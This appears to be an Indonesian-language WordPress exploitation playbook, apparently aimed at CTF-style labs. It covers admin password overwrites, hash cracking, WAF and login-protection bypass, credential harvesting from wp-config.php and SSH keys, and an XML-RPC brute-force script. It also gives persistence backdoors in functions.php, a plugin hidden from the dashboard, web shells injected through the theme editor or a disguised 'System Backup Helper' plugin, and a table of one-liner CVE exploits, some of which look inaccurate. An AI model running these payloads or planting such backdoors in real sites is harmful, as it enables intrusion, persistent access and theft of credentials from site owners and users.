UPDATE wp_users SET user_pass = '$P$B91/K729E4y5eN8/70fE4X4e0.w4.z0' WHERE ID = 1;

# Step 5: Login ke http://target/wp-admin menggunakan user admin dan password baru
# Step 6: Eksekusi RCE via Theme Editor / Plugin Upload
```

## 🔑 BAGIAN 5: HASH CRACKING

### 5.1 WordPress Password Hash Format

- WordPress menggunakan algoritma **phpass** (Portable PHP password hashing framework) yang berbasis MD5 bertingkat.

- **Format Identifier:** `$P$` atau `$H$` disusul 31 karakter alphanumeric.

- **Contoh Hash:** `$P$B91/K729E4y5eN8/70fE4X4e0.w4.z0`

### 5.2 Cracking WordPress Hashes
```bash
# Simpan hash ke file
echo '$P$B91/K729E4y5eN8/70fE4X4e0.w4.z0' > hash.txt

# 1. Crack Menggunakan Hashcat (Mode 400 = phpass / WordPress)
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

# 2. Hashcat dengan Rule Attack (Jika Wordlist Standar Gagal)
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 3. Crack Menggunakan John the Ripper
john --format=phpass hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 4. Verifikasi Hasil John
john --format=phpass hash.txt --show
```

## 🛡️ BAGIAN 6: WAF & PROTECTION BYPASS

### 6.1 Mendeteksi WordPress Security Plugins

- **Wordfence:** Memicu Cookie `wfvt_XXXXX` dan HTTP Headers `X-Powered-By: Wordfence` atau memblokir payload dengan halaman `403 Forbidden` bertuliskan _"Generated by Wordfence"_.

- **iThemes Security:** Mengubah URL default `/wp-admin/` menjadi custom slug, menambahkan header `X-iThemes-Security`.

- **Sucuri:** Memiliki response header `X-Sucuri-ID` atau `Server: Sucuri/Cloudproxy`.

- **Cloudflare:** Response header `CF-RAY`, `Server: cloudflare`, dan menyajikan Cloudflare Challenge Page (503/403).

- **WPS Hide Login:** Mengembalikan response `404 Not Found` standar pada `/wp-admin/` dan `/wp-login.php`.

### 6.2 Bypass Techniques Per Plugin

1. **Wordfence Bypass (Rate Limiting Evasion):**

    Gunakan HTTP Headers spoofing jika Wordfence berada di belakang reverse proxy misconfigured:

```bash
    wpscan --url "$TARGET" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1"
    ```

2. **WPS Hide Login Bypass:**

    Temukan real login URL dengan memeriksa REST API, sitemap, atau redirect behavior:

```bash
    # Cek Endpoint Register / Lost Password
    curl -s -i "$TARGET/wp-register.php" | grep -i "Location:"
    curl -s -i "$TARGET/wp-signup.php" | grep -i "Location:"
    
    # Cek Referer Handling
    curl -s -i "$TARGET/wp-admin/options.php" -H "Referer: $TARGET/wp-admin/"
    ```

3. **Login Lockdown / CAPTCHA Bypass:**

    Beralih dari form HTML `/wp-login.php` ke `xmlrpc.php` (Multicall) atau REST API (`/wp-json/jwt-auth/v1/token`), karena mekanisme CAPTCHA/Lockdown sering kali tidak diimplementasikan pada API backend.

### 6.3 WPScan dengan WAF
```bash
# Evasion Flags di WPScan
wpscan --url "$TARGET" \
  --random-user-agent \
  --throttle 1000 \
  --request-timeout 10 \
  --http-auth "user:pass" \
  --proxy http://127.0.0.1:8080 # Route ke Burp Suite untuk analisa request
```

## 🐚 BAGIAN 7: POST-EXPLOITATION

### 7.1 Setelah Dapat Web Shell
```bash
# 1. Identifikasi User System & Environment
id && whoami && pwd && uname -a

# 2. Cari dan Extract Credentials dari wp-config.php
find / -name "wp-config.php" 2>/dev/null
cat /var/www/html/wp-config.php | grep -E "DB_|SECRET|AUTH"

# 3. Dump Database MySQL Lengkap dari Shell
mysqldump -u DB_USER -p'DB_PASS' DB_NAME > /tmp/dump.sql
# Atau hanya dump tabel users
mysqldump -u DB_USER -p'DB_PASS' DB_NAME wp_users > /tmp/wp_users.sql

# 4. Cari File Backup / Sensitive Data Lainnya
find /var/www/html/ -type f -name "*.bak" -o -name "*.swp" -o -name "*.old" -o -name "*.zip" 2>/dev/null

# 5. Cek SSH Keys untuk User System Lain
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null
```

### 7.2 Lateral Movement dari WordPress

- **Password Reuse:** Jalankan skrip brute-force lokal menggunakan password yang diekstrak dari `wp-config.php` terhadap user yang terdaftar di `/etc/passwd` via SSH/Su.

- **Database Credentials Mining:** Periksa apakah kredensial database dapat mengakses service lain (seperti phpMyAdmin internal, PostgreSQL, Redis, atau FTP).

### 7.3 Persistence di WordPress

1. **Backdoor pada `functions.php` (Theme Active):**

    Tambahkan kode berikut pada `/wp-content/themes/<active-theme>/functions.php`:

```php
    add_action('init', function() {
        if (isset($_GET['backdoor_key']) && $_GET['backdoor_key'] === 'secret123') {
            system($_GET['exec']);
            exit;
        }
    });
    // Trigger: http://target.com/?backdoor_key=secret123&exec=id
    ```

2. **Hidden Backdoor Plugin:**

    Buat plugin dengan nama menyerupai plugin sistem bawaan (misal `wp-performance-booster.php`) dan sembunyikan dari UI dashboard menggunakan filter `option_active_plugins`:

```php
    add_filter('all_plugins', function($plugins) {
        unset($plugins['wp-performance-booster/wp-performance-booster.php']);
        return $plugins;
    });
    ```

## 🤖 BAGIAN 8: AUTOMATION SCRIPTS

### 8.1 Script `wp_full_audit.sh`
```bash
#!/usr/bin/env bash
# ==============================================================================
# File: wp_full_audit.sh
# Description: Automated WordPress Enumeration & Reconnaissance Script
# Target Platform: Parrot OS XFCE
# ==============================================================================

if [ -z "$1" ]; then
    echo "Usage: $0 <TARGET_URL>"
    echo "Example: $0 http://10.10.10.187"
    exit 1
fi

TARGET="${1%/}"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] Starting WordPress Audit on: ${TARGET}${NC}"

# 1. Version Detection
echo -e "\n${GREEN}[+] 1. Checking WordPress Version...${NC}"
VER_META=$(curl -s "$TARGET" | grep -i '<meta name="generator"' | head -n 1)
VER_FEED=$(curl -s "$TARGET/feed/" | grep -oP '(?<=\?v=)[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
if [ -z "$VER_FEED" ]; then
    VER_FEED=$(curl -s "$TARGET/feed/" | grep "<generator>" | grep -oP '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
fi
echo " - Meta Generator Tag: $VER_META"
echo " - RSS Feed Version: $VER_FEED"

# 2. User Enumeration
echo -e "\n${GREEN}[+] 2. Enumerating Users...${NC}"
echo " - Method A (REST API):"
curl -s "$TARGET/wp-json/wp/v2/users" | jq -r '.[].slug' 2>/dev/null | sed 's/^/   / '
echo " - Method B (Author Archives Redirect):"
for id in {1..3}; do
    curl -s -i "$TARGET/?author=$id" | grep -i "^Location:" | sed 's/^/   / '
done

# 3. XML-RPC Check
echo -e "\n${GREEN}[+] 3. Checking XML-RPC Status...${NC}"
XML_RESP=$(curl -s -X POST "$TARGET/xmlrpc.php" -d "<methodCall><methodName>demo.sayHello</methodName></methodCall>")
if echo "$XML_RESP" | grep -q "Hello!"; then
    echo -e " ${RED}[!] XML-RPC is ENABLED and responsive!${NC}"
else
    echo " - XML-RPC seems disabled or blocked."
fi

# 4. Plugin Enumeration from DOM
echo -e "\n${GREEN}[+] 4. Enumerating Installed Plugins (DOM Analysis)...${NC}"
curl -s "$TARGET" | grep -oE 'wp-content/plugins/[^/"]+' | sort -u | awk -F'/' '{print " - "$3}'

# 5. Sensitive File Check
echo -e "\n${GREEN}[+] 5. Checking Sensitive Files & Logs...${NC}"
FILES=(
    "wp-config.php.bak"
    "wp-config.old"
    "wp-content/debug.log"
    ".htaccess"
    "readme.html"
    "license.txt"
)

for file in "${FILES[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
    if [ "$STATUS" -eq 200 ]; then
        echo -e " ${RED}[!] EXPOSED ($STATUS): $TARGET/$file${NC}"
    else
        echo " - ($STATUS): $TARGET/$file"
    fi
done

echo -e "\n${YELLOW}[*] Audit Complete.${NC}"
```

### 8.2 Script `wp_plugin_checker.sh`
```bash
#!/usr/bin/env bash
# ==============================================================================
# File: wp_plugin_checker.sh
# Description: Fuzzing WordPress plugins and searching for local CVEs
# ==============================================================================

if [ -z "$1" ]; then
    echo "Usage: $0 <TARGET_URL>"
    exit 1
fi

TARGET="${1%/}"
WORDLIST="/usr/share/seclists/Discovery/Web-Content/CMS/wordpress-plugins.fuzz.txt"

if [ ! -f "$WORDLIST" ]; then
    WORDLIST="/usr/share/wordlists/dirb/common.txt"
fi

echo -e "[*] Fuzzing Plugins on $TARGET using $WORDLIST..."

ffuf -u "$TARGET/wp-content/plugins/FUZZ/" -w "$WORDLIST" -mc 200,301,302 -s -o /tmp/plugins.json

if [ -f /tmp/plugins.json ]; then
    PLUGINS=$(jq -r '.results[].input.FUZZ' /tmp/plugins.json 2>/dev/null)
    echo -e "\n[+] Discovered Plugins & Local Exploit Database Lookup:"
    for plugin in $PLUGINS; do
        echo -e "\n----------------------------------------"
        echo -e "Plugin: $plugin"
        VER=$(curl -s "$TARGET/wp-content/plugins/$plugin/readme.txt" | grep -i "Stable tag:" | awk '{print $NF}')
        echo "Detected Version: ${VER:-Unknown}"
        echo "Searchsploit Results:"
        searchsploit "WordPress Plugin $plugin" | head -n 10
    done
fi
```

### 8.3 Python Script: `xmlrpc_bruteforce.py`
```python
#!/usr/bin/env python3
"""
File: xmlrpc_bruteforce.py
Description: High-speed WordPress XML-RPC Multicall Brute-Forcer
"""

import sys
import requests
import xml.etree.ElementTree as ET

def build_multicall_payload(username, passwords):
    root = ET.Element("methodCall")
    m_name = ET.SubElement(root, "methodName")
    m_name.text = "system.multicall"
    
    params = ET.SubElement(root, "params")
    param = ET.SubElement(params, "param")
    value = ET.SubElement(param, "value")
    array = ET.SubElement(value, "array")
    data = ET.SubElement(array, "data")
    
    for pwd in passwords:
        call_val = ET.SubElement(data, "value")
        struct = ET.SubElement(call_val, "struct")
        
        # Member 1: methodName
        mem1 = ET.SubElement(struct, "member")
        name1 = ET.SubElement(mem1, "name")
        name1.text = "methodName"
        val1 = ET.SubElement(mem1, "value")
        str1 = ET.SubElement(val1, "string")
        str1.text = "wp.getUsersBlogs"
        
        # Member 2: params
        mem2 = ET.SubElement(struct, "member")
        name2 = ET.SubElement(mem2, "name")
        name2.text = "params"
        val2 = ET.SubElement(mem2, "value")
        arr2 = ET.SubElement(val2, "array")
        data2 = ET.SubElement(arr2, "data")
        
        u_val = ET.SubElement(data2, "value")
        u_str = ET.SubElement(u_val, "string")
        u_str.text = username
        
        p_val = ET.SubElement(data2, "value")
        p_str = ET.SubElement(p_val, "string")
        p_str.text = pwd
        
    return ET.tostring(root, encoding="utf-8", method="xml")

def main():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <TARGET_XMLRPC_URL> <USERNAME> <WORDLIST>")
        sys.exit(1)
        
    url = sys.argv[1]
    username = sys.argv[2]
    wordlist_path = sys.argv[3]
    
    batch_size = 300
    
    with open(wordlist_path, "r", encoding="latin-1") as f:
        passwords = [line.strip() for line in f if line.strip()]
        
    print(f"[*] Loaded {len(passwords)} passwords. Brute-forcing '{username}' via Multicall...")
    
    for i in range(0, len(passwords), batch_size):
        batch = passwords[i:i + batch_size]
        payload = build_multicall_payload(username, batch)
        
        headers = {"Content-Type": "text/xml"}
        try:
            res = requests.post(url, data=payload, headers=headers, timeout=15)
            if "isAdmin" in res.text or "url" in res.text:
                # Parse Response to find matching index
                print(f"\n[+] SUCCESS! Valid Credentials Found!")
                print(f"    Check password batch range: {i} to {i+batch_size}")
                # Manual confirmation loop within batch
                for single_pass in batch:
                    single_payload = f"<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{single_pass}</string></value></param></params></methodCall>"
                    r = requests.post(url, data=single_payload, headers=headers)
                    if "faultCode" not in r.text:
                        print(f"\n[!!!] CONFIRMED CREDENTIAL: {username}:{single_pass}")
                        sys.exit(0)
        except Exception as e:
            print(f"[-] Error sending request: {e}")

if __name__ == "__main__":
    main()
```

## ⚠️ BAGIAN 9: COMMON ERRORS & TROUBLESHOOTING

1. **WPScan Terlalu Lambat / Hanged:**
    - _Sebab:_ Multi-threading dibatasi oleh target server atau WAF rate-limiting.
    - _Solusi:_ Tambahkan flag `--max-threads 50` atau atur `--throttle 500`.

2. **Plugin Tidak Terdeteksi (Passive Mode Only):**
    - _Sebab:_ HTML homepage tidak memuat stylesheet/script dari plugin tersebut.
    - _Solusi:_ Paksa mode agresif: `--plugins-detection aggressive`.

3. **User Enum Gagal (Author Archives Disabled):**
    - _Sebab:_ Security plugin memblokir request `/?author=1`.
    - _Solusi:_ Gunakan REST API Endpoint `/wp-json/wp/v2/users` atau oEmbed endpoint.

4. **XML-RPC Return `403 Forbidden` / `405 Method Not Allowed`:**
    - _Sebab:_ `.htaccess` atau Nginx memblokir akses direct ke `xmlrpc.php`.
    - _Solusi:_ Pivot fokus ke form login standar, REST API, atau vulnerabilities pada plugin.

5. **Upload Plugin Gagal (`File Size Exceeds Limit`):**
    - _Sebab:_ Konfigurasi `upload_max_filesize` di `php.ini` server terlalu kecil.
    - _Solusi:_ Kompres webshell/plugin hingga berukuran sekecil mungkin (< 10 KB) dan hindari menyertakan library eksternal dalam file ZIP.

6. **Theme Editor Disabled (`DISALLOW_FILE_EDIT` is True):**
    - _Sebab:_ `wp-config.php` menonaktifkan fitur edit file dari UI.
    - _Solusi:_ Jangan gunakan Theme Editor. Upload malicious plugin via ZIP atau manfaatkan File Manager plugin CVE jika ada.

7. **`wp-admin` Menampilkan Error 403 saat Diakses dari IP Luar:**
    - _Sebab:_ IP Whitelisting dikonfigurasi pada web server.
    - _Solusi:_ Periksa apakah ada SSH Tunneling / SOCKS Proxy yang dapat digunakan via Parrot OS (`proxychains`).

8. **WPScan API Limit Habis (50 Request/Day Limit):**
    - _Sebab:_ Kuota free API Key tercapai.
    - _Solusi:_ Jalankan WPScan tanpa `--api-token` (tetap dapat enumerate plugin/user, hanya tidak menampilkan link CVE detail).

9. **Hash PHP / Phpass Tidak Bisa Di-crack:**
    - _Sebab:_ Password terlalu kompleks atau tidak ada di `rockyou.txt`.
    - _Solusi:_ Terapkan Hashcat rules (`best64.rule` / `OneRuleToRuleThemAll.rule`) atau lakukan SQL Injection UPDATE password secara langsung di database.

10. **Reverse Shell Connect Kembali tapi Langsung Closed:**
    - _Sebab:_ Firewall outgoing memblokir port non-standar.
    - _Solusi:_ Gunakan port standar outbound seperti `443` atau `80` untuk Netcat listener.

11. **WPScan Error `Permission Denied` saat Menyimpan Cache:**
    - _Sebab:_ User di Parrot OS tidak memiliki izin tulis ke direktori `~/.wpscan/cache`.
    - _Solusi:_ Jalankan `sudo chown -R $USER:$USER ~/.wpscan`.

12. **REST API Disabled (`Disable REST API` Plugin Active):**
    - _Sebab:_ Access control plugin memblokir `/wp-json/`.
    - _Solusi:_ Manfaatkan XML-RPC, RSS Feed `/feed/`, atau parsing HTML source code manual.

## 📋 BAGIAN 10: CHEATSHEET

### 10.1 Quick Target Variables Setup
```bash
export TARGET="http://10.10.10.187"
export ATTACKER_IP="10.10.14.2"
export ATTACKER_PORT="4444"
```

### 10.2 Phase 1: Rapid Reconnaissance & Version Detection
```bash
# WPScan Fast Discovery (Passive + Users + Plugins + Themes)
wpscan --url "$TARGET" --enumerate vp,vt,u --plugins-detection mixed --random-user-agent

# Version Detection via Feed & Generator Tag
curl -s "$TARGET" | grep -i '<meta name="generator"'
curl -s "$TARGET/feed/" | grep -oP '(?<=\?v=)[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1

# Detect Installed Plugins from HTML DOM
curl -s "$TARGET" | grep -oE '(wp-content/plugins/[^/"]+)' | sort -u | cut -d'/' -f3
```

### 10.3 Phase 2: User Enumeration Techniques
```bash
# Method 1: REST API wp/v2/users
curl -s "$TARGET/wp-json/wp/v2/users" | jq -r '.[].slug'

# Method 2: Author Archive ID Redirect (IDs 1-5)
for id in {1..5}; do curl -s -I "$TARGET/?author=$id" | grep -i "^Location:"; done

# Method 3: oEmbed API endpoint
curl -s "$TARGET/wp-json/oembed/1.0/embed?url=$TARGET&format=json" | jq -r '.author_name'
```

### 10.4 Phase 3: XML-RPC Exploitation
```bash
# Check if XML-RPC is Active (Expect: 'Hello!')
curl -s -X POST "$TARGET/xmlrpc.php" -d "<methodCall><methodName>demo.sayHello</methodName></methodCall>"

# List All Available Methods
curl -s -X POST "$TARGET/xmlrpc.php" -d "<methodCall><methodName>system.listMethods</methodName></methodCall>"

# High-Speed Multi-Call Password Attack via WPScan
wpscan --url "$TARGET" -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc-multicall
```

### 10.5 Phase 4: Admin Panel to RCE (Post-Authentication)
```bash
# Method 1: Theme Editor Nonce Extraction & 404.php Injection
curl -s -c cookies.txt -d "log=admin&pwd=P@ssword123!&wp-submit=Log+In" "$TARGET/wp-login.php"
NONCE=$(curl -s -b cookies.txt "$TARGET/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty" | grep -oP 'id="_wpnonce"\s+value="\K[a-f0-9]+' | head -1)
curl -s -b cookies.txt -X POST "$TARGET/wp-admin/theme-editor.php"   -d "action=update" -d "file=404.php" -d "theme=twentytwenty"   -d "newcontent=<?php system(\$_GET['cmd']); ?>" -d "_wpnonce=$NONCE" -d "submit=Update+File"
# Trigger webshell:
curl -s "$TARGET/wp-content/themes/twentytwenty/404.php?cmd=id"

# Method 2: Malicious Plugin Zip Generation (Upload via /wp-admin/plugin-install.php)
mkdir -p /tmp/rev_plugin && cat << 'EOF' > /tmp/rev_plugin/rev.php
<?php
/**
 * Plugin Name: System Backup Helper
 * Version: 1.0
 * Author: Security
 */
if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); }
?>
EOF
cd /tmp && zip -r rev_plugin.zip rev_plugin/
```

### 10.6 Phase 5: Hash Cracking & Database Override
```bash
# Crack phpass ($P$) via Hashcat (Mode 400)
hashcat -m 400 -a 0 wp_hash.txt /usr/share/wordlists/rockyou.txt

# Crack phpass via John the Ripper
john --format=phpass wp_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Overwrite Admin Password directly in MySQL (New Pass: 'P@ssword123!')
# phpass hash: $P$B8qW3.xH/qA3YqjTqk/8EeVFh.3s6/1 atau MD5 hash: 5f4dcc3b5aa765d61d8327deb882cf99
mysql -u DB_USER -pDB_PASS -h 127.0.0.1 DB_NAME -e "UPDATE wp_users SET user_pass=MD5('P@ssword123!') WHERE ID=1;"
```

### 10.7 Phase 6: Post-Exploitation & Credential Harvesting
```bash
# One-liner to extract database credentials from wp-config.php
cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME|DB_HOST"

# Dump entire WordPress users table
mysqldump -u DB_USER -pDB_PASS DB_NAME wp_users > /tmp/wp_users.sql

# Search for backup files and exposed logs
find /var/www/html/ -type f \( -name "*.bak" -o -name "*.old" -o -name "debug.log" -o -name "*.sql" \) 2>/dev/null
```

### 10.8 Full 15-Plugin CVE Quick Reference Table

| **Plugin / Core** | **CVE** | **Versi Rentan** | **Type** | **One-Liner Exploit Command / PoC** |
|---|---|---|---|---|
| **WP File Manager** | CVE-2020-25213 | 6.0 - 6.8 | RCE (Pre-Auth) | `searchsploit -m 49178 && python3 49178.py $TARGET` *(elFinder connector arbitrary upload)* |
| **Contact Form 7** | CVE-2020-35489 | < 5.3.2 | Arbitrary File Upload | `curl -F "your-file=@shell.php." -F "_wpcf7=1" "$TARGET/wp-json/contact-form-7/v1/contact-forms/1/feedback"` |
| **Duplicator** | CVE-2020-11738 | < 1.3.27 | Path Traversal / File Read | `curl -s "$TARGET/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../wp-config.php"` |
| **ThemeREX Addons** | CVE-2020-9043 | All <= 2.2 | Auth Bypass / RCE | `curl -s "$TARGET/wp-admin/admin-ajax.php?action=trx_addons_exec_cmd&cmd=id"` |
| **Ninja Forms** | CVE-2021-34656 | < 3.4.34 | Unauth XSS / RCE | `curl -s "$TARGET/?ninja_forms_ajax_submit=1&form_id=1&action=nf_ajax_submit"` |
| **Elementor** | CVE-2022-1329 | 3.6.0 - 3.6.2 | Authenticated RCE | `curl -X POST "$TARGET/wp-admin/admin-ajax.php" -d "action=elementor_upload_template&file=@shell.zip"` |
| **WooCommerce** | CVE-2021-32789 | 5.5.0 - 5.5.1 | SQL Injection | `curl -s "$TARGET/?wc-ajax=get_refreshed_fragments&id=1' UNION SELECT 1,user_pass FROM wp_users-- -"` |
| **Popup Builder** | CVE-2023-6000 | < 2.6.8 | Stored XSS to RCE | `curl -X POST "$TARGET/wp-admin/admin-ajax.php" -d "action=sgpb_save_popup&popupData=<script>...</script>"` |
| **WP Automatic** | CVE-2024-27956 | < 3.92.0 | SQL Injection (Unauth) | `curl -X POST "$TARGET/wp-content/plugins/wp-automatic/inc/csv.php" -d "q=UPDATE wp_users SET user_pass=md5('password') WHERE ID=1"` |
| **Advanced Custom Fields** | CVE-2023-30777 | < 6.1.6 | Reflected XSS | `curl -s "$TARGET/wp-admin/edit.php?post_type=acf-field-group&post_status=%22><script>alert(1)</script>"` |
| **BackupBuddy** | CVE-2022-31474 | 8.5.8.0 - 8.7.4.1 | Arbitrary File Download | `curl -s "$TARGET/wp-admin/admin-ajax.php?action=backupbuddy_local_download&file=/etc/passwd"` |
| **Loginizer** | CVE-2020-27615 | < 1.6.4 | Unauthenticated SQLi | `curl -s "$TARGET/wp-login.php" -d "log=admin' OR 1=1-- -&pwd=test&wp-submit=Log+In"` |
| **Ultimate Member** | CVE-2023-3460 | < 2.6.7 | Unauthenticated Priv Esc | `curl -X POST "$TARGET/wp-admin/admin-ajax.php" -d "action=um_registration&wp_capabilities[administrator]=1"` |
| **WPS Hide Login** | N/A (Bypass) | All | Info Disclosure | `curl -s -i "$TARGET/wp-admin/options.php" -H "Referer: $TARGET/wp-admin/"` |
| **Jetpack** | CVE-2019-16520 | Multiple | Stored XSS / Auth Bypass | `curl -s "$TARGET/wp-json/jetpack/v4/shortcodes"` |

### 10.9 Quick CTF Triage Checklist ("Apakah WordPress Ini CTF-Friendly?")

Jalankan 5 tes cepat ini dalam 30 detik pertama:
1. **Tes XML-RPC (5 Detik):**
   `curl -s -X POST "$TARGET/xmlrpc.php" -d "<methodCall><methodName>demo.sayHello</methodName></methodCall>"`
   *Jika membalas `Hello!`* -> Target sangat rentan brute force cepat multi-call!
2. **Tes REST API Users (5 Detik):**
   `curl -s "$TARGET/wp-json/wp/v2/users" | jq .`
   *Jika ada user slug* -> Target memberi username valid secara cuma-cuma untuk diserang password-nya.
3. **Tes Readme Plugins (10 Detik):**
   `curl -s "$TARGET" | grep -oE 'wp-content/plugins/[^/"]+' | sort -u`
   *Jika ada plugin pihak ketiga* -> Segera cari exploit pre-auth di Searchsploit.
4. **Tes Registrasi Publik (5 Detik):**
   `curl -s -I "$TARGET/wp-login.php?action=register"`
   *Jika 200 OK* -> Daftar akun subscriber baru, lalu eskalasi via Path 4.2.
5. **Tes File Sensitif & Backup (5 Detik):**
   `curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-config.php.bak"`
   *Jika 200 OK* -> Langsung download dan ambil password database backend!

---

# [🛡️ 17a. WordPress Advanced Exploitation & Workflow Guide](/docs/wordpress) — Interactive Decision Guide

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="http://10.10.11.200"
export TARGET_IP="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu
export LPORT="4444"
export WPSCAN_API_KEY=""         # Daftar gratis di wpscan.io
mkdir -p ~/wp_loot/{files,creds,keys,shells,hashes}
cd ~/wp_loot

echo "[*] Target: $TARGET | LHOST: $LHOST:$LPORT"
```

**Output yang diharapkan:**

text

```
[*] Target: http://10.10.11.200 | LHOST: 10.10.14.5:4444
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI WORDPRESS & VERSI

## ═══════════════════════════════════════

> **Tujuan:** Pastikan ini benar-benar WordPress dan kumpulkan info versi sebelum apapun.

### Langkah 0.1 — Deteksi WordPress (5 Detik)

Bash

```
# Command 1: Cek generator meta tag (paling cepat)
curl -s "$TARGET" | grep -i 'generator'

# Command 2: Cek wp-login.php (konfirmasi WordPress)
curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-login.php"

# Command 3: Cek wp-admin redirect
curl -s -I "$TARGET/wp-admin/" | grep -i "location"
```

**OUTPUT BERHASIL ✅ — WordPress terdeteksi:**

HTML

```
<meta name="generator" content="WordPress 5.8.1" />
```

text

```
200
Location: http://10.10.11.200/wp-login.php
```

**Cara baca:**

|Info|Nilai|Tindakan|
|---|---|---|
|`WordPress 5.8.1`|Versi core|Cari CVE untuk versi ini|
|`wp-login.php = 200`|Login page aktif|Siap untuk brute force|
|`wp-admin/ redirect`|Admin panel aktif|Target standar|

➡️ Catat versi, lanjut ke **Langkah 0.2**

**OUTPUT GAGAL ❌ — Tidak ada generator tag:**

text

```
(kosong / tidak ada output)
```

➡️ Coba cara lain:

Bash

```
# Cek via RSS feed (paling reliable)
curl -s "$TARGET/feed/" | grep -oP '(?<=\?v=)[0-9.]+' | head -1
curl -s "$TARGET/feed/" | grep "<generator>"

# Cek via readme.html (sering ada versi)
curl -s "$TARGET/readme.html" | grep -i "version"

# Cek wp-content path (bukti WordPress)
curl -s "$TARGET" | grep "wp-content"
```

**OUTPUT GAGAL ❌ — wp-login.php return 404:**

text

```
404
```

➡️ Kemungkinan WPS Hide Login aktif. Cari real login URL:

Bash

```
# Cek register page untuk redirect hint
curl -s -I "$TARGET/wp-register.php" | grep -i "location"
curl -s -I "$TARGET/wp-signup.php" | grep -i "location"

# Cek via REST API
curl -s "$TARGET/wp-json/" | jq '.authentication'

# Search di source code
curl -s "$TARGET" | grep -i "login\|sign.in\|log.in" | head -20
```

---

### Langkah 0.2 — Versi Detection Lengkap

Bash

```
# Command 1: Via meta tag
curl -s "$TARGET" | grep -oP 'WordPress [0-9]+\.[0-9]+(\.[0-9]+)?' | head -1

# Command 2: Via RSS feed (paling akurat)
curl -s "$TARGET/feed/" | grep -oP '(?<=\?v=)[0-9.]+' | head -1

# Command 3: Via style.css tema default
curl -s "$TARGET/wp-includes/css/dist/block-library/style.min.css" | head -1

# Command 4: Via readme.html (sering ada)
curl -s "$TARGET/readme.html" | grep -A1 "Version"
```

**OUTPUT BERHASIL ✅:**

text

```
WordPress 5.8.1
5.8.1
```

➡️ **SIMPAN VERSI:**

Bash

```
export WP_VERSION="5.8.1"
echo "[*] WordPress Version: $WP_VERSION"

# Langsung cek CVE untuk versi ini
searchsploit "WordPress $WP_VERSION"
searchsploit "WordPress 5.8"
```

> **📌 VERSI KRITIS — Langsung ke exploit jika ditemukan:**
> 
> |Versi|CVE|Type|Priority|
> |---|---|---|---|
> |< 4.7.2|CVE-2017-1001000|REST API Content Injection|🔴 KRITIS|
> |< 5.0.0|CVE-2019-8942/43|Author RCE (Crop Image)|🔴 KRITIS|
> |5.8-5.8.2|CVE-2022-21661|SQL Injection|🟠 TINGGI|

---

## ═══════════════════════════════════════

## FASE 1: RECONNAISSANCE — WPScan & Manual

## ═══════════════════════════════════════

> **Tujuan:** Kumpulkan SEMUA informasi — plugin, tema, user, vulnerabilities — sebelum mulai exploit.

### Langkah 1.1 — WPScan Full Enumeration

Bash

```
# Command 1: Full scan dengan API token (RECOMMENDED)
wpscan --url "$TARGET" \
    --enumerate vp,vt,u,tt,cb \
    --plugins-detection aggressive \
    --api-token "$WPSCAN_API_KEY" \
    --random-user-agent \
    --format json \
    -o ~/wp_loot/wpscan_results.json \
    2>&1 | tee ~/wp_loot/wpscan_output.txt

# Command 2: Tanpa API token (jika tidak punya)
wpscan --url "$TARGET" \
    --enumerate vp,vt,u \
    --plugins-detection aggressive \
    --random-user-agent \
    2>&1 | tee ~/wp_loot/wpscan_no_api.txt

# Command 3: Cepat tanpa aggressive (jika WAF ketat)
wpscan --url "$TARGET" \
    --enumerate u \
    --detection-mode passive \
    2>&1 | tee ~/wp_loot/wpscan_passive.txt
```

**OUTPUT BERHASIL ✅ — Hasil scan normal:**

text

```
[+] WordPress version 5.8.1 identified
[+] WordPress theme in use: twentytwenty
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 
[i] Plugin(s) Identified:
[+] contact-form-7
 | Location: http://10.10.11.200/wp-content/plugins/contact-form-7/
 | Last Updated: 2023-11-30T00:00:00.000Z
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: Contact Form 7 < 5.3.2 - Arbitrary File Upload
 |     Fixed in: 5.3.2
 |     CVE: CVE-2020-35489
```

**Cara baca output WPScan — PENTING:**

|Indikator|Artinya|Tindakan|
|---|---|---|
|`[!] vulnerabilities identified`|Plugin vulnerable|Langsung ke Fase 3 untuk exploit|
|`User(s) Identified`|Username valid|Simpan untuk brute force|
|`[+] theme: twentytwenty`|Nama tema aktif|Nanti diperlukan untuk 404.php inject|
|`XML-RPC seems enabled`|XMLRPC aktif|Langsung ke Langkah 1.4|
|`readme.html found`|Versi terekspos|Catat versi persis|

Bash

```
# Parse hasil JSON WPScan
# Ambil plugin vulnerable
cat ~/wp_loot/wpscan_results.json | jq '.plugins[] | select(.vulnerabilities != null) | {plugin: .slug, vulns: [.vulnerabilities[].title]}' 2>/dev/null

# Ambil username
